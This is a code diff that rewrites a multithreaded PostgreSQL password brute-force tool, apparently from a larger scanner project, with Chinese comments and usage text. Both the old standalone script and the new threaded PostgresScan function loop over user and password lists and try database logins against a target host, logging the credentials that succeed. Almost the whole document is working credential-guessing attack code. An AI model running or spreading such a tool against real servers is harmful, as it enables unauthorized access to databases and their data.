@@ -1,71 +1,49 @@
 # -*- coding: utf-8 -*-
-
+import psycopg2
 import os, sys, re, socket, time
-from functools import partial
-from multiprocessing.dummy import Pool as ThreadPool
+import pymssql
+import queue
+from common import config
+import threading
+from common import log
 
-try:
-    import psycopg2
-except ImportError:
-    print ('\n[!] psycopg2,请到下面网址下载：')
-    print ('[!] http://www.codegood.com/archives/129')
-    exit()
+threadnum = 10
 
 
-def usage():
-    print ('+' + '-' * 90 + '+')
-    print ('\t\t\t   Python Postgres暴力破解工具多线程版')
-    print ('+' + '-' * 90 + '+')
-    if len(sys.argv) != 6:
-        print ("用法: " + os.path.basename(sys.argv[0]) + " 待破解的ip/domain 端口 数据库 用户名列表 密码列表")
-        print ("实例: " + os.path.basename(sys.argv[0]) + "   www.minsv.com   3306  Postgres  user.txt  pass.txt")
-        sys.exit()
-
-
-def Postgres_brute(user, password):
-    "Postgres数据库破解函数"
-    db = None
+def PostgresScan(info):
+    qlist = queue.Queue()
+    for user in config.Userdict["postgresql"]:
+        for pwd in config.Passwords:
+            pwd = pwd.replace("{user}", user)
+            qlist.put(user + ':' + pwd)
+    threads = []
+    for x in range(1, threadnum + 1):
+        t = threading.Thread(target=scan, args=(qlist, info.Host, info.Ports, info.Timeout))
+        threads.append(t)
+        t.setDaemon(True)  # 主线程完成后不管子线程有没有结束，直接退出
+        t.start()
     try:
-        # print "user:", user, "password:", password
-        db = psycopg2.connect(host=host, user=user, passwd=password, db=sys.argv[3], port=int(sys.argv[2]))
-        # print '[+] 破解成功：', user, password
-        result.append('用户名：' + user + "\t密码：" + password)
+        while True:
+            if qlist.empty():
+                break
+            else:
+                time.sleep(1)
     except KeyboardInterrupt:
-        print ('按您的吩咐,已成功退出程序!')
-        exit()
-    except psycopg2.Error as  msg:
-        # print '未知错误:', msg
-        pass
-    finally:
-        if db:
-            db.close()
+        print("Exit the program...")
 
 
-if __name__ == '__main__':
-    usage()
-    start_time = time.time()
-    if re.match(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', sys.argv[1]):
-        host = sys.argv[1]
-    else:
-        host = socket.gethostbyname(sys.argv[1])
-    userlist = [i.rstrip() for i in open(sys.argv[4])]
-    passlist = [j.rstrip() for j in open(sys.argv[5])]
-    print ('\n[+] 目  标：%s \n' % sys.argv[1])
-    print ('[+] 用户名：%d 条\n' % len(userlist))
-    print ('[+] 密  码：%d 条\n' % len(passlist))
-    print ('[!] 密码破解中,请稍候……\n')
-    result = []
+def scan(qlist, host, port, Timeout):
+    while not qlist.empty():
+        user, pwd = qlist.get().split(':')
+        try:
+            psycopg2.connect(host=host, user=user, passwd=pwd, db="Postgres",port=port)
+            result = "[+] postgresql:{}:{}:{} {}".format(host, port, user, pwd)
+            log.LogSuccess(result)
+        except Exception as e:
+            result = "[-] postgresql {}:{} {} {} {}".format(host, port, user, pwd, e.__str__())
+            log.LogError(result)
+            pass
 
-    for user in userlist:
-        partial_user = partial(Postgres_brute, user)
-        pool = ThreadPool(10)
-        pool.map(partial_user, passlist)
-        pool.close()
-        pool.join()
-    if len(result) != 0:
-        print ('[+] 恭喜,Postgres密码破解成功!\n')
-        for x in {}.fromkeys(result).keys():
-            print( x + '\n')
-    else:
-        print( '[-] 杯具了,Postgres密码破解失败!\n')
-    print ('[+] 破解完成，用时： %d 秒' % (time.time() - start_time))
+
+
+
